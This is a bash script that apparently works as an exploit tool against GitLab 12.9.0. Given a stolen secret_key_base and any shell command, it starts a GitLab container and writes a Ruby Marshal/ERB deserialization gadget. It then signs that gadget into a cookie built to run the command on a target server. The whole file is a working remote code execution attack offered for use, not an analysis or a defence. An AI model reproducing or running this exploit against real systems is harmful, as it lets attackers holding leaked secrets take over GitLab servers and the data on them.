#!/bin/bash

logFd=2 ## default to logging to stderr

SECRET_YML_PATH="/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"

print_usage() {
    printf "Usage: ./agent <secret_key_base> <payload>\n" >&$logFd
}

if test -z "$1" -o -z "$2"; then print_usage; exit 1; fi

SECRET_KEY_BASE="$1"
COMMAND_TO_EXCECURE="$2"
RUBY_SCRIPT="/tmp/cookie_maker.rb"

printf "[I] Start docker and run GitLab 12.9.0 in it\n" >&$logFd

emergency_exit () {
    printf "[E] Errors during %s. Trying to remove the container and exit\n" "$1" >&$logFd
    docker stop gitlab 2&>/dev/null
    exit
}

docker run --rm -d --hostname=gitlab.hv -p 443:443 -p 80:80 -p 2222:22 --name=gitlab gitlab/gitlab-ce:12.9.0-ce.0 >/dev/null || emergency_exit "docker run"

printf "[I] Generating Ruby script\n" >&$logFd

cat > $RUBY_SCRIPT <<- EOM
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= \`$COMMAND_TO_EXCECURE\` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
EOM

printf "[D] Payload:\n\n" >&$logFd
cat $RUBY_SCRIPT >&$logFd

printf "\n[I] Copying Ruby script into the container\n" >&$logFd
docker cp $RUBY_SCRIPT gitlab:/tmp/ || emergency_exit "the script copying"

printf "[I] Waiting for %s" "$SECRET_YML_PATH" >&$logFd
while docker exec gitlab test ! -f $SECRET_YML_PATH; do printf . >&$logFd ; sleep 1 ; done

printf "\n[I] Add stolen secret_key_base into the container\n" >&$logFd

docker exec gitlab sed -i "s/secret_key_base:.*/secret_key_base: $SECRET_KEY_BASE/g" $SECRET_YML_PATH || emergency_exit "secret_key_base substitution"

printf "[I] Generating cookie\n\n" >&$logFd
cookie=$(docker exec gitlab gitlab-rails runner $RUBY_SCRIPT 2>/dev/null) || emergency_exit "running Rubt script"

printf "%s" "$cookie"

printf "[I] Removing the container and exit\n\n" >&$logFd
docker stop gitlab 2&>/dev/null
exit 0